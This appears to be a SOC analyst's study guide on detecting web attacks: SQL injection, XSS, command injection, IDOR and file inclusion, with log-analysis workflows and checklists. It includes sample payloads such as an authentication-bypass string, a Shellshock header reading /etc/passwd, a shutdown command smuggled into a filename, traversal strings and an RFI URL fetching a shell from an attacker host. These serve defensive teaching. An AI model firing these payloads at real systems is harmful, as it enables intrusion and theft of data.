# Detecting Web Attacks

## Table of Contents

- [Introduction](#introduction)

- [Why Detecting Web Attacks is Important](#why-detection-matters)

- [OWASP](#owasp)

- [How Web Applications Work](#http-fundamentals)

- [Detecting SQL Injection (SQLi) Attacks](#what-is-sql-injection)

- [Detecting Cross-Site Scripting (XSS) Attacks](#what-is-xss)

- [Detecting Command Injection Attacks](#command-injection)

- [Detecting Insecure Direct Object Reference (IDOR) Attacks](#what-is-idor)

- [Detecting Remote File Inclusion (RFI) & Local File Inclusion (LFI) Attacks](#local-file-inclusion-lfi)
  
  
  ---

## Introduction

### What are Web Attacks?
Web attacks target web applications to gain unauthorized access, steal sensitive information, or disrupt services. Since web applications are exposed to the internet, they are among the most common attack surfaces.

> **Fact:** Approximately **75% of cyberattacks target web applications** (Acunetix).

### Common Web Attacks
- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Command Injection
- Insecure Direct Object Reference (IDOR)
- Remote File Inclusion (RFI)
- Local File Inclusion (LFI)
- File Upload / Web Shell

### Why Detection Matters
SOC analysts should detect attacks as early as possible to:
- Prevent data breaches
- Stop unauthorized access
- Reduce business impact
- Trigger incident response

Common defensive technologies:
- Web Application Firewall (WAF)
- Intrusion Prevention System (IPS)
- SIEM detection rules

---

# OWASP

## What is OWASP?
The **Open Worldwide Application Security Project (OWASP)** is a nonprofit organization dedicated to improving application security.

## OWASP Top 10 (2025)

| Rank | Risk |
|------|------|
| A01 | Broken Access Control |
| A02 | Security Misconfiguration |
| A03 | Software Supply Chain Failures |
| A04 | Cryptographic Failures |
| A05 | Injection |
| A06 | Insecure Design |
| A07 | Authentication Failures |
| A08 | Software or Data Integrity Failures |
| A09 | Security Logging and Alerting Failures |
| A10 | Mishandling of Exceptional Conditions |

---

# HTTP Fundamentals

## HTTP Overview
HTTP is a **Layer 7 (Application Layer)** protocol that enables communication between clients (browsers) and web servers.

Communication flow:

Client → HTTP Request → Server → HTTP Response → Client

---

## HTTP Request Structure

An HTTP request contains:

1. Request Line
2. Request Headers
3. Request Body

### Important Request Headers

| Header | Purpose |
|---------|---------|
| Host | Target website/domain |
| Cookie | Stores session information |
| User-Agent | Browser or application details |
| Accept | Accepted response formats |
| Accept-Encoding | Supported compression |
| Accept-Language | Preferred language |
| Connection | Keep-Alive or Close |
| Upgrade-Insecure-Requests | Request HTTPS version |

---

## HTTP Response Structure

An HTTP response contains:

1. Status Line
2. Response Headers
3. Response Body

### Status Code Categories

| Code | Meaning |
|------|---------|
| 1xx | Informational |
| 2xx | Success |
| 3xx | Redirect |
| 4xx | Client Error |
| 5xx | Server Error |

### Important Response Headers

| Header | Purpose |
|---------|---------|
| Date | Response timestamp |
| Server | Web server information |
| Last-Modified | Resource modification time |
| Content-Type | MIME type |
| Content-Length | Response size |
| Connection | Connection handling |

---

# SQL Injection (SQLi)

## What is SQL Injection?

SQL Injection occurs when user input is inserted directly into SQL queries without proper validation or parameterization.

Example vulnerable query:

```sql
SELECT * FROM users
WHERE username='USERNAME'
AND password='PASSWORD';
```

Attack payload:

```sql
' OR 1=1 -- -
```

Result:

```sql
SELECT * FROM users
WHERE username=''
OR 1=1;
```

The condition is always true, potentially bypassing authentication.

---

## Types of SQL Injection

- In-band SQLi (Classic)
- Blind (Inferential) SQLi
- Out-of-band SQLi

---

## Attacker Objectives

- Authentication bypass
- Execute commands
- Read sensitive data
- Modify database records
- Delete information

---

## Prevention

- Use parameterized queries
- Avoid raw SQL
- Sanitize all user input
- Keep frameworks updated
- Use secure frameworks properly

---

# Detecting SQL Injection

## Indicators

### SQL Keywords

Look for:

- SELECT
- UNION
- INSERT
- UPDATE
- DELETE
- WHERE
- AND
- OR
- CHR

### Special Characters

Watch for:

- '
- "
- --
- ;
- ()
- %

### Automated Scanner Indicators

- High request rate
- Complex payloads
- Suspicious User-Agent
- Repeated requests to same parameter

---

## URL Encoding

Special characters are URL-encoded.

Examples:

| Character | Encoding |
|-----------|-----------|
| Space | `%20` |
| ' | `%27` |
| ( | `%28` |
| ) | `%29` |
| % | `%25` |

Always decode URLs before analysis.

---

## SQLi Log Analysis Workflow

1. Examine requested URLs
2. Decode URL encoding
3. Search for SQL keywords
4. Identify targeted parameters
5. Count requests per second
6. Check User-Agent
7. Compare response sizes (if available)
8. Determine if attack was successful

### Example Findings

- Target parameter: `id`
- Source IP: `192.168.31.174`
- >50 requests/sec
- Automated scanner
- Success unknown (response unavailable)

---

# Cross-Site Scripting (XSS)

## What is XSS?

Cross-Site Scripting allows attackers to inject malicious JavaScript into legitimate web pages.

Example payload:

```html
<script>alert(1)</script>
```

Redirect payload:

```html
<script>
window.location='https://example.com'
</script>
```

---

## Types of XSS

- Reflected XSS
- Stored XSS
- DOM-Based XSS

---

## Attacker Objectives

- Steal session cookies
- Capture credentials
- Redirect users
- Execute arbitrary JavaScript

---

## Prevention

- Sanitize user input
- HTML encode output
- Keep frameworks updated
- Use built-in framework protections

---

# Detecting XSS

## Indicators

### JavaScript Keywords

Look for:

- script
- alert
- prompt
- console.log
- document.cookie
- window.location

### Special Characters

- <
- >
- "
- '
- %

### Automated Scanner Indicators

- Rapid repeated requests
- Payload variations
- urllib/python User-Agent
- Multiple payload attempts

---

## XSS Log Analysis Workflow

1. Review requested pages
2. Decode URL encoding
3. Search for JavaScript payloads
4. Examine request frequency
5. Inspect User-Agent
6. Identify source IP
7. Determine success (if response available)

### Example Findings

- Target: `/blog/?s=`
- Payloads contained:
  - `<script>`
  - `prompt()`
  - `console.log()`
- Automated vulnerability scanner
- Traffic routed through Cloudflare
- Success unknown

---

# Key Detection Tips

## SQL Injection

Look for:
- SQL keywords
- URL encoding
- High request frequency
- Automated User-Agents
- Complex payloads

---

## Cross-Site Scripting

Look for:
- `<script>` tags
- JavaScript functions
- Encoded payloads
- Automated scanning behavior
- Browser-related payloads

---

# SOC Analyst Investigation Checklist

- Review HTTP requests
- Decode URL-encoded data
- Inspect request parameters
- Identify attack signatures
- Check User-Agent
- Analyze request frequency
- Determine targeted endpoint
- Review response codes/sizes
- Assess attack success
- Escalate if exploitation is suspected


---

# Command Injection

## What is Command Injection?

Command Injection occurs when **unsanitized user input is executed directly by the operating system shell**, allowing attackers to run arbitrary system commands.

> Unlike SQL Injection, Command Injection compromises the **underlying operating system**, making it one of the most critical web vulnerabilities.

---

## How Command Injection Works

Consider a web application that copies uploaded files:

```bash
cp filename /tmp
```

Normal input:

```text
letsdefend.txt
```

Malicious input:

```text
letsdefend;ls;.txt
```

Executed commands:

```bash
cp letsdefend
ls
.txt
```

The `;` separates commands, causing the operating system to execute additional attacker-supplied commands.

Example payload:

```text
letsdefend;shutdown;.txt
```

Could shut down the server.

Attackers may also execute reverse shells to gain persistent access.

---

## Attacker Objectives

- Execute operating system commands
- Gain remote shell access
- Escalate privileges
- Read sensitive files
- Shut down services
- Fully compromise the server

---

## Prevention

- Sanitize all user input
- Never trust filenames
- Apply least privilege to web application accounts
- Run applications inside containers or virtualized environments

---

# Detecting Command Injection

## Detection Indicators

### Check Every User-Controlled Field

Command injection can occur in:

- URL parameters
- POST body
- Cookies
- User-Agent
- Referer
- Custom headers

---

### Look for Shell Commands

Common commands include:

- ls
- dir
- cat
- type
- cp
- mv
- whoami
- pwd
- id
- shutdown
- wget
- curl

---

### Look for Shell Operators

Watch for:

```text
;
&
&&
||
|
$
``
$()
```

---

### Look for Reverse Shell Payloads

Attackers often attempt to spawn shells using:

- bash
- nc (netcat)
- python
- perl
- php
- curl
- wget

---

## Example Detection

Suspicious HTTP request:

```http
GET / HTTP/1.1

User-Agent: () { :;}; echo "NS:" $(</etc/passwd)
```

Indicators:

- User-Agent contains Bash commands
- Reads `/etc/passwd`
- Attempts command execution

This is a classic **Shellshock (CVE-2014-6271)** exploitation attempt.

---

# Insecure Direct Object Reference (IDOR)

## What is IDOR?

Insecure Direct Object Reference (IDOR) occurs when an application fails to verify whether a user is authorized to access a requested resource.

It is categorized under **Broken Access Control**.

---

## How IDOR Works

Example request:

```text
https://example.com/user?id=1
```

If the application simply changes:

```text
?id=2
?id=3
?id=4
```

without checking ownership, attackers can access other users' data.

---

## Attacker Objectives

- View personal information
- Access confidential documents
- Modify records
- Delete resources
- Perform unauthorized actions

---

## Prevention

- Always verify authorization
- Validate ownership before serving data
- Use session information instead of user-supplied IDs
- Minimize exposed parameters

---

# Detecting IDOR

Unlike SQLi or XSS, IDOR has **no distinctive payload**, making detection more challenging.

## Detection Indicators

### Inspect Every Parameter

Look beyond `id`.

Examples:

- user_id
- account
- document
- order
- invoice
- profile
- file

---

### Look for Enumeration

Attackers often request sequential IDs:

```text
id=1
id=2
id=3
id=4
```

This pattern is highly suspicious.

---

### Look for Brute Force Behavior

Indicators:

- Many requests
- Same endpoint
- Sequential values
- Short time interval

---

### Analyze Response Characteristics

If HTTP responses are unavailable:

- Compare response size
- Compare status codes
- Look for anomalies

---

## Example Findings

- Multiple requests to:

```text
wp-admin/user-edit.php?user_id=
```

- Source routed through Cloudflare
- User-Agent:

```text
wfuzz/3.1.0
```

- Automated enumeration attack
- Response sizes nearly identical
- Attack likely unsuccessful (302 redirects)

---

# Local File Inclusion (LFI)

## What is LFI?

Local File Inclusion occurs when an application includes local files using **unsanitized user input**.

Attackers can read sensitive files from the server.

---

## Example

Normal request:

```text
language=en
```

Loads:

```text
website/en/home.php
```

Attack payload:

```text
../../../../etc/passwd
```

Attempts to read:

```text
/etc/passwd
```

---

## Remote File Inclusion (RFI)

RFI occurs when the application includes **files hosted on a remote server**.

Example payload:

```text
http://attacker.com/shell.php
```

The vulnerable application downloads and executes attacker-controlled code.

---

## Attacker Objectives

- Read sensitive files
- Execute malicious code
- Obtain credentials
- Deploy web shells
- Cause denial of service

---

## Prevention

- Sanitize all user input
- Validate filenames
- Restrict include paths
- Disable remote file inclusion
- Validate server-side only

---

# Detecting LFI & RFI

## Detection Indicators

### Inspect Every User-Controlled Field

Potential vulnerable parameters:

- file
- page
- include
- template
- language
- path

---

### Look for Directory Traversal

Common payloads:

```text
../
..\
```

Repeated traversal:

```text
../../../../../../
```

---

### Look for Sensitive Files

Common targets:

Linux

```text
/etc/passwd
/etc/shadow
```

Windows

```text
boot.ini
win.ini
hosts
SAM
```

---

### Look for URL Schemes (RFI)

Indicators:

```text
http://
https://
ftp://
```

These may indicate remote file inclusion attempts.

---

### Look for Special Characters

Watch for:

```text
/
\
.
..
%00
```

---

# SOC Detection Checklist

## Command Injection

- Inspect all request fields
- Look for shell commands
- Identify shell operators
- Detect reverse shell payloads
- Investigate unusual User-Agent values

---

## IDOR

- Look for sequential IDs
- Identify brute-force enumeration
- Review repeated requests
- Compare response sizes and status codes
- Validate authorization failures

---

## LFI & RFI

- Search for directory traversal (`../`)
- Identify access to sensitive files
- Detect remote URLs (`http://`, `https://`)
- Inspect include/file parameters
- Look for null-byte (`%00`) payloads
  
  